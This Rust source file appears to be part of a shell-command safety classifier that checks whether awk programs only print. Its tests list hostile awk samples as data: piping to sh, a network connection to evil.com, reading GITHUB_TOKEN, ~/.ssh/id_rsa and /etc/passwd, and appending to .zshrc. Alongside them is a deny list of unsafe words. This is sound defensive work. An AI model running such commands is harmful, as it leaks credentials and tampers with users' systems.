//! `awk`: the program is data, never shell or file names.
//!
//! An awk program prints, except where it runs a command (`system()`, `|`
//! pipes, gawk's `|&`), redirects output to a file (`print > "f"`), reads a
//! file or a variable the command line does not name (`getline`, `ENVIRON`,
//! assigning `ARGV`), closes or flushes a stream (`close()`, `fflush()`), or
//! loads code (`@include`, `@load`, gawk's indirect call `@f()`). The words
//! are found in the raw program text, strings and regexes included, so no
//! quoting can hide one; a word inside a string only costs a prompt. `|` and
//! `>` are looked for outside string and regex literals, where awk reads them
//! as a pipe or a redirection: inside one they are alternation or text
//! (`/a|b/`, `"->"`). Such a program, one the shell expands a variable into
//! (`awk "$prog"`), `-f FILE` and any option but `-F` and `-v` become an
//! `awk @<text>` atom. awk stops reading options at the program.

use super::text::{Arg, Operands, Spec, parse, unproven};
use super::{ClassifyError, Sink};
use crate::lexer::Word;

const AWK: Spec = Spec {
    flags: "",
    valued: "Fv",
    optional: "",
    long_flags: &[],
    long_valued: &[],
    long_optional: &[],
    permute: false,
};

/// Words that run a command, read a file or a variable, close or flush a
/// stream, or load code; looked for in the raw text, strings included.
const UNSAFE: &[&str] = &[
    "system", "getline", "ENVIRON", "ARGV", "@", "close(", "fflush(",
];

pub(super) fn classify(
    argv: &[String],
    words: &[Word],
    sink: &mut Sink,
) -> Result<Operands, ClassifyError> {
    let mut ops = Operands::default();
    let mut program = None;
    for arg in parse(argv, &AWK) {
        match arg {
            Arg::Opt { data, .. } => ops.data.extend(data),
            Arg::Unknown(word) => unproven(argv, word, sink)?,
            Arg::Operand(at) => {
                program.get_or_insert(at);
            }
        }
    }
    if let Some(at) = program {
        ops.data.push(at);
        // The shell puts text the command line does not show into the program.
        let expanded = words.get(at).is_some_and(expanded);
        if expanded || !harmless(&argv[at]) {
            unproven(argv, &argv[at], sink)?;
        }
    }
    Ok(ops)
}

/// Whether the shell expands part of `word`: a `$` outside single quotes, or
/// a command substitution.
fn expanded(word: &Word) -> bool {
    !word.substitutions.is_empty()
        || word
            .text
            .match_indices('$')
            .any(|(at, _)| !word.literal.iter().any(|span| span.contains(&at)))
}

/// No unsafe word in the raw text; outside string and regex literals, no `|`
/// (a pipe; `||` is logical or) and no `>` after the first `print`: output
/// redirection only exists in `print` and `printf`, and a `>` before them is
/// a comparison.
fn harmless(program: &str) -> bool {
    if UNSAFE.iter().any(|word| program.contains(word)) {
        return false;
    }
    let code = code(program).replace("||", "");
    let printing = code.find("print").map_or("", |at| &code[at..]);
    !code.contains('|') && !printing.contains('>')
}

/// `program` with the contents of its string and regex literals taken out,
/// delimiters kept. A `"` opens a string. A `/` opens a regex only where awk
/// cannot read it as division: at the start, or after `(`, `,`, `{`, `}`,
/// `;`, `~`, `!`, `&`, `|` or a newline; after an operand it stays code, as
/// awk divides there. A backslash escapes the next character. awk ends either
/// literal at the end of its line, so does this; an unterminated one ends the
/// program. Where awk reads a literal as longer than this does (gawk's `/` in
/// a bracket expression), more text stays code, never less.
fn code(program: &str) -> String {
    let mut out = String::with_capacity(program.len());
    let mut chars = program.chars();
    let mut last = None;
    while let Some(c) = chars.next() {
        let opens = match c {
            '"' => true,
            '/' => matches!(
                last,
                None | Some('(' | ',' | '{' | '}' | ';' | '~' | '!' | '&' | '|' | '\n')
            ),
            _ => false,
        };
        out.push(c);
        if opens {
            while let Some(d) = chars.next() {
                match d {
                    '\\' => {
                        chars.next();
                    }
                    '\n' => break,
                    _ if d == c => break,
                    _ => {}
                }
            }
            out.push(c);
            last = Some(c);
        } else if !c.is_whitespace() || c == '\n' {
            last = Some(c);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::{code, harmless};

    #[test]
    fn printing_programs() {
        for program in [
            "{print $1}",
            "$3 > 100 {print $1}",
            "/error/ {n++} END {print n}",
            "NR > 1 && ($2 == \"x\" || $2 == \"y\") {sum += $4} END {printf \"%d\\n\", sum}",
            "BEGIN {FS=\",\"} {print $2, length($0)}",
            // `|` as regex alternation, in every place a regex may start
            "/^## |^# /{print}",
            "$0 ~ /a|b/ {print}",
            "!/a|b/",
            "NR==1 || /x|y/ {print}",
            "(/a|b/) {print}",
            "/a/,/b/",
            "{s+=$1} END{print s}",
            // `>` and `|` inside a regex or a string after `print`
            "/<<<<<<< /{p=1} p{print NR\": \"$0} />>>>>>> /{p=0}",
            "{print \"a|b\", $1}",
            "{print $1 \" -> \" $2}",
            "{print \"a\\\"|>b\"}",
        ] {
            assert!(harmless(program), "{program}");
        }
    }

    #[test]
    fn programs_that_may_do_more() {
        for program in [
            "BEGIN{system(\"id\")}",
            "{print | \"sh\"}",
            "{print |& \"/inet/tcp/0/evil.com/80\"}",
            "BEGIN{\"id\" | getline x; print x}",
            "{getline line < \"/etc/passwd\"}",
            "{print > \"/tmp/x\"}",
            "{printf \"%s\", $0 >> \"log\"}",
            "BEGIN{print ENVIRON[\"GITHUB_TOKEN\"]}",
            "BEGIN{ARGV[1]=\"/Users/me/.ssh/id_rsa\"; ARGC=2} {print}",
            "@include \"lib.awk\"",
            "BEGIN{f=\"sys\" \"tem\"; @f(\"id\")}",
            "{print; close(\"x\"); fflush()}",
            "/a|b/{print >> \"/Users/me/.zshrc\"}",
            "/a|b/{print | \"sh\"}",
            // a `/` after an operand is division, so what follows is code
            "{print $0 \"/\" > \"f\"}",
            "{print 1/2 > \"f\"}",
            "{print a[1] / 2 > \"f\"}",
            "{print ($0) / 2 > \"f\"}",
            // a string or regex ends with its line
            "{print \"a\n> \\\"f\\\"\"}",
            "{x = 1 /2/ ; print > \"f\" }",
        ] {
            assert!(!harmless(program), "{program}");
        }
    }

    #[test]
    fn literals_are_taken_out() {
        assert_eq!(code("/a|b/ {print \"x>y\"}"), "// {print \"\"}");
        assert_eq!(code("{print 1/2 > \"/f\"}"), "{print 1/2 > \"\"}");
        assert_eq!(code("{print \"a\\\"b\"}"), "{print \"\"}");
        assert_eq!(code("x ~ /\\//"), "x ~ //");
    }
}
